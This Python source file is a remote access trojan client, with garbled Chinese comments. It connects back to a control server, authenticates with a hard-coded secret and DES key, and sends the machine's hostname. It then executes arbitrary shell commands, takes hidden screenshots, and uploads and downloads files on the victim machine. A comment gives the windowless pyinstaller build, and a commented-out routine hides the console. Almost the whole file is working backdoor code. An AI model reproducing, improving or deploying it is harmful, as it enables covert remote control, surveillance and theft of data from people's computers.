#-*- coding : gbk -*-
# coding: gbk
from subprocess import Popen,PIPE,STDOUT
from time import sleep
from socket import socket,AF_INET,SOCK_STREAM,gethostname
from threading import Thread
from pyautogui import screenshot
from pyDes import des
from os import stat,getenv,remove
from os.path import exists
#pyinstaller -F -w pys-c01.1.py
#�ӽ���
def encrypt(text):
    cryptor = des(b"qsdV%^Gb", IV=b"qsdV%^Gb")  # self.key��bytes������16�ı������ɣ� self.iv������16λ
    length = 16
    count = len(text)
    if (count % length != 0):
        add = length - (count % length)
    else:
        add = 0
    text = text + ("\0".encode() * add)  # �����"\0"��������bytes����Ȼ�޷���textƴ��
    ciphertext = cryptor.encrypt(text)
    return ciphertext

def decrypt(text):
    cryptor = des(b"qsdV%^Gb", IV=b"qsdV%^Gb")
    plain_text = cryptor.decrypt(text).decode("gbk")
    return plain_text.rstrip("\0")  #�еĲ���������䣬��ʵdecode����֮��"\0"�Զ���û����

#�����ͼ
def takephoto(name):
    im = screenshot()
    filename=getenv("temp")+"\\{}".format(name)
    im.save(filename)
    return filename

#���ļ�
def sputfile(filepath):
    try:
        # ���嶨���ļ���Ϣ��128s��ʾ�ļ���Ϊ128bytes����l��ʾһ��int��log�ļ����ͣ��ڴ�Ϊ�ļ���С
        # �����ļ�ͷ��Ϣ�������ļ������ļ���С
        # �������ļ��Զ����Ƶ���ʽ�ֶ���ϴ���������
        if exists(filepath):
            sock2.sendall(encrypt("Yes".encode('gbk')))
            sleep(1)
            fp = open(filepath, 'rb')
            data=fp.read()
            # while 1:
            #     data = fp.read(1024)
            #     if not data:
            #         # print('{0} file send over...'.format(ldata[1]))
            #         break
            sock2.send(encrypt(data))
            fp.close()
            return 1
        else:
            return 0
    except Exception as e:
        print(e)
        return 0
#���ļ�
def sgetfile(filepath):
    try:
        # �洢�ڸýű�����Ŀ¼����
        filexists  = decrypt(sock2.recv(1024))
        if filexists=="No":
            sock2.sendall(encrypt("no".encode('gbk')))
            print("�ļ������ڣ�")
        else:
            sock2.sendall(encrypt("ok".encode('gbk')))
            fp = open('{}'.format(filepath), 'wb')
            # print('start receiving...')
            # �������δ���Ķ�����������д�뵽�ļ�
            data = decrypt(sock2.recv(1024000))
            fp.write(data.encode('gbk'))
            fp.close()
            return 1
    except :
        return 0
#���ļ�
def putfile(filepath):
    try:
        # ���嶨���ļ���Ϣ��128s��ʾ�ļ���Ϊ128bytes����l��ʾһ��int��log�ļ����ͣ��ڴ�Ϊ�ļ���С
        # �����ļ�ͷ��Ϣ�������ļ������ļ���С
        # �������ļ��Զ����Ƶ���ʽ�ֶ���ϴ���������
        if exists(filepath):
            size = stat(filepath).st_size
            sock2.sendall(encrypt(str(size).encode("gbk")))
            sleep(1)
            fp = open(filepath, 'rb')
            while 1:
                data = fp.read(1024)
                if not data:
                    # print('{0} file send over...'.format(ldata[1]))
                    break
                sock2.send(data)
            fp.close()
            return 1
        else:
            return 0
    except Exception as e:
        return 0
#���ļ�
def getfile(filepath):
    try:
        # �洢�ڸýű�����Ŀ¼����
        filesize = decrypt(sock2.recv(1024))
        if filesize=="No":
            return 0
        else:
            fp = open('{}'.format(filepath), 'wb')
            recvd_size = 0  # �����ѽ����ļ��Ĵ�С
            # print('start receiving...')
            # �������δ���Ķ�����������д�뵽�ļ�
            while not recvd_size == int(filesize):
                if int(filesize) - recvd_size > 1024:
                    data = sock2.recv(1024)
                    recvd_size += len(data)
                else:
                    data = sock2.recv(int(filesize) - recvd_size)
                    recvd_size = int(filesize)
                fp.write(data)
            fp.close()
            return 1
    except :
        return 0
# #���غڿ�
# def hideConsole():
#   whnd = windll.kernel32.GetConsoleWindow()
#   if whnd != 0:
#     windll.user32.ShowWindow(whnd, 0)
# hideConsole()

#��������ִ��
def rn(mod):
    pross=Popen('{}'.format(mod),shell=True,stdout=PIPE,stderr=STDOUT,encoding="gbk")
    # if pross.communicate(timeout=30):
    #     resturt="ִ�г�ʱ������"
    if pross:
        resturt=pross.stdout.read().encode("gbk")
        pross.stdout.close()
    else:
        resturt=pross.stderr.read().encode("gbk")
        pross.stderr.close()
    return resturt

#�޷�������ִ�У���python����ֱ������exe��
def rn2(args):
    Popen('{}'.format(args), shell=True, stdout=PIPE, stderr=STDOUT, encoding="gbk")

def listsize(m):
    if m==3:
        return True
    elif m==4:
        return True
    else:
        return False

if __name__ == '__main__':
    nonec=1
    while True:
        try:
            for i in range(5):
                try:
                    print("��{}�γ��Ի���".format(i))
                    # address_server = ('172.16.1.1', 62543)
                    # address_server = ('172.16.232.1', 62543)
                    address_server = ('127.0.0.1', 28089)
                    sock2 = socket(AF_INET, SOCK_STREAM)
                    sock2.connect(address_server)
                    a="kj#$!#@&*DZF555".encode("gbk")
                    sock2.sendall(encrypt(a))
                    # sock2.sendall("kj#$!#@&*DZF555".encode("gbk"))
                    sleep(1)
                    break
                except:
                    if i == 4:
                        print("��ʱ��")
                        exit()
                    sleep(30)
            print("�����ɹ���")
            win_name = gethostname()
            sock2.sendall(encrypt(win_name.encode('gbk')))
            while True:
                data = decrypt(sock2.recv(10240000))
                ldata=list(data.split())
                #�ǽ���ִ������
                if ldata[0]=="nrcv":
                    data=data.strip("nrcv ")
                    r1=Thread(target=rn2,kwargs={"args":"{}".format(data)})
                    r1.start()
                    sock2.sendall(encrypt("It is running,no data recv��".encode("gbk")))
                    continue
                #�����
                elif ldata[0]=="tkphoto" and len(ldata)==3:
                    filepath = takephoto(ldata[1])
                    putfile(filepath)
                    remove(filepath)
                    continue
                #���������ͻ����ļ�
                elif ldata[0]=="fget" and listsize(len(ldata)):
                    if ldata[1]=="-s" and len(ldata)==4:
                        if sputfile(ldata[2]):
                            continue
                        else:
                            sock2.sendall(encrypt("No".encode('gbk')))
                            continue
                    elif len(ldata)==3:
                        if putfile(ldata[1]):
                            continue
                        else:
                            sock2.sendall(encrypt("No".encode('gbk')))
                            continue
                    else:
                        continue
                #����˴���ͻ����ļ�
                elif ldata[0] == "fput" and listsize(len(ldata)):
                    if ldata[1]=="-s" and len(ldata)==4:
                        sgetfile(ldata[3])
                        continue
                    elif len(ldata)==3:
                        getfile(ldata[2])
                        continue
                    else:
                        continue
                #��������ִ������
                else:
                    if 'quit' == data:
                        break
                    m = rn(str(data))
                    if m == b'':
                        sock2.sendall(encrypt("no data recv!".encode("gbk")))
                    try:sock2.sendall(encrypt(m))
                    except:sock2.sendall(encrypt("hava something wrong!".encode("gbk")))
            sock2.close()
            break
        except:
            if nonec>1:
                break
            else:
                nonec=nonec+1
                continue